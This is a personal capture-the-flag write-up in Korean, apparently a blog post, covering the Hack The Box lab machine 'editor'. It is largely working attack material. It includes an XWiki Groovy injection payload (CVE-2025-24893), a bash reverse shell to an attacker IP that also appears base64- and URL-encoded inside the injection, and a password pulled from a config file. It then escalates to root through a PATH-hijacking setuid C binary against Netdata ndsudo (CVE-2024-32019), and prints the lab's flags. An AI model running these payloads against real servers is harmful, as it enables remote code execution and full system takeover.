---
slug: "editor"
title: "editor"
date: 2026-07-05
category: "미분류"
tags: []
excerpt: "echo \"10.129.11.227 wiki.editor.htb\" | sudo tee -a /etc/hosts ~~~"
readingTime: 7
---

#### Box: editor | Linux | Easy
날짜:
소요시간:

##### Open Ports
22
80 -> editor.hub   (nginx 사용중)
8080 -> xwiki.editor.hub

##### Interesting Services
80포트에 뭔가를 다운로드 받는게 있음
8080 포트에 XWiki Debian 15.10.8  -> 이 버전에 unathenticated RCE 취약점 있다고 함
	  -> [CVE-2025-24893](https://github.com/a1baradi/Exploit/blob/main/CVE-2025-24893.py)
##### Initial Foothold
벡터:
명령어:
~~~sh
echo "10.129.11.227 editor.htb" | sudo tee -a /etc/hosts

echo "10.129.11.227 wiki.editor.htb" | sudo tee -a /etc/hosts
~~~

앞서 봤던 cve 우선 wiki.editor.htb에서 재현해보려함
~~~
/bin/get/Main/SolrSearch?media=rss&text=

Payload: /bin/get/Main/SolrSearch?media=rss&text=}}}{{async async=false}}{{groovy}}println("cat /etc/passwd".execute().text){{/groovy}}{{/async}}
~~~

```sh
#kali에서 nc 켜둠
bash -c 'bash -i >& /dev/tcp/10.10.15.230/5555 0>&1'


#-> root, oliver 이렇게 두 개 있는거 확인 가능
Payload: 
/bin/get/Main/SolrSearch?media=rss&text=}}}{{async async=false}}{{groovy}}println("cat /etc/passwd".execute().text){{/groovy}}{{/async}}
```

~~~sh
bash -c 'sh -i >& /dev/tcp/10.10.15.230/5555 0>&1'

-> base 64 encode : YmFzaCAtYyAnc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTUuMjMwLzU1NTUgMD4mMSc=

}}}}}}{{{{async async=false}}}}{{{{groovy}}}}"bash -c {{echo,YmFzaCAtYyAnc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTUuMjMwLzU1NTUgMD4mMSc=
}}|{{base64,-d}}|{{bash,-i}}".execute(){{{{/groovy}}}}{{{{/async}}}}


}}}{{async async=false}}{{groovy}}"bash -c {echo,YmFzaCAtYyAnc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTUuMjMwLzU1NTUgMD4mMSc=}|{base64,-d}|{bash,-i}".execute(){{/groovy}}{{/async}}

Payload: 
/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7D%22bash%20-c%20%7Becho%2CYmFzaCAtYyAnc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTUuMjMwLzU1NTUgMD4mMSc%3D%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D%22.execute%28%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D
~~~
-> 이렇게 웹쉘 진입 성공 (xwiki)

##### Privilege Escalation (xwiki->oliver)
벡터:
명령어:

**웹쉘에 들어 왔으면 해당 페이지에 중요시스템 (여기선 xwiki)의 conf 파일이 어디에 위치해있는지 먼저 찾아보는게 제일 중요함!!!**

여기선 `/etc/xwiki`에 있었음

config가 들어 있는 파일을 다 뒤져봐
```sh
cat hibernate.cfg.xml | grep password
    <property name="hibernate.connection.password">theEd1t0rTeam99</property>
```

```sh
ssh oliver@10.129.11.227

cat user.txt
```
**user.txt:** b6a9f9014eca47c05234a9642b87570c

##### Privilege Escalation (oliver->root)
벡터:
명령어: 
```sh
find / -user root -perm -4000 -ls 2>/dev/null

-> 이거 보는데 ndsudo 라는 애가 좀 의심스러워서 찾아봄 -> 루트 권한 없는 사용자를 대신해 제한된 시스템 명령을 안전하게 실행하기 위한 suid 루트 바이너리 라고함
```

[CVE-2024-32019](https://github.com/dollarboysushil/CVE-2024-32019-Netdata-ndsudo-PATH-Vulnerability-Privilege-Escalation#1-create-a-privilege-escalation-binary) : 얘가 명령 바이너리를 해석할 때 사용자가 제어하는 ​​PATH 환경 변수를 따른다고 함

~~~C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", NULL);
    return 0;
}
~~~

근데 해당 box에는 gcc 같은 컴파일 도구가 없음
~~~sh
#칼리에서
gcc nvme.c -o nvme                          
python3 -m http.server 8000

#user에서
wget http://10.10.15.230:8000/nvme

echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

export PATH=/tmp:$PATH

chmod +x nvvme

oliver@editor:/tmp$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
root@editor:/tmp#
~~~
**root.txt:** 2662f0567a852b94ed29e84654c1cc5d
##### Rabbit Hole (막혔던 것)

##### 다음 박스에서 써먹을 것
- 웹쉘에 들어 왔으면 해당 페이지에 중요시스템 (여기선 xwiki)의 conf 파일이 어디에 위치해있는지 먼저 찾아보는게 제일 중요함!!!
